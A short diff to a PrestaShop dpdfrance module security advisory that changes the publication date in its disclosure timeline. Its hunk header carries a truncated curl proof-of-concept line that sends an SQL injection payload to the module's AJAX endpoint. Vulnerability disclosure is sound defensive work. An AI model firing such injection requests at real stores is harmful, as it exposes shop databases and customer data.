@@ -90,7 +90,7 @@ curl -v -X POST -d 'action_ajax_dpdfrance=setAddressOrder&order=1%27;select(0x73
 | 2022-12-20 | Contact PrestaShop Addons Team |
 | 2023-01-27 | Fix published on addons PrestaShop marketplace for PrestaShop 1.7+ only |
 | 2023-01-28 | Request a CVE ID |
-| 2023-03-08 | Publication of this security advisory |
+| 2023-03-09 | Publication of this security advisory |
 
 ## Links
 
